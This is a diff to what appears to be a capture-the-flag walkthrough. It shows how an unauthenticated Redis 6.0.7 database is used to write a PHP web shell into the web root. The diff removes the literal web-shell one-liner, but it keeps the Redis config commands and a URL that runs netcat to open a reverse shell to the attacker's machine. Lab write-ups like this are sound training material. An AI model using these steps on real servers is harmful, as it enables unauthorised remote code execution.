@@ -27,7 +27,7 @@ excerpt_separator: <!--more-->
 <img src="/img/res/5.gobuster-start.png">
 
 <p>while we wait on gobuster, let’s do some research on the Redis 6.0.7 db </p>
-<img src="/img/res/">
+
 
 <p>After installing the redis-server on my local machine and enumerating the Redis db I discovered I could connect to the db via shell with no authentication. I also found a possible username vianka by running the info command  </p>
 <img src="/img/res/6.Redis-db-enum.png">
@@ -40,7 +40,7 @@ excerpt_separator: <!--more-->
 <p>I assumed the Apache was serving the site in the default directories due to the default web page I found.In the Redis-cli I changed the dir to /var/www/html and set the db file name to shell.php</p>
 <p>config set dir /var/www/html</p>
 <p>config set dbfilename shell.php</p>
-<p> set test "<php commad here>"</p>
+<p> set test "php commad here"</p>
 
 <img src="/img/res/8.redis-commands-test-php.png">
 
@@ -50,8 +50,9 @@ excerpt_separator: <!--more-->
 <p>Let’s setup a listener with netcat on our local machine </p>
 <img src="/img/res/10.setup-listner.png">
 
-<p>Now change test from to "<php system get command here>" using the set command </p>
-<p> set test ""<?php system($_GET['cmd']);?>"" </p>
+<p>Now change test to "php system get command here" using the redis-cli </p>
+<img src="/img/res/12.php-oneliner.png">
+
 <p> now we can issue command injection in the web browser</p>
 <p>http://[host]/Redis.php?cmd=nc [attack machine] [port] -e /bin/sh</p>
 
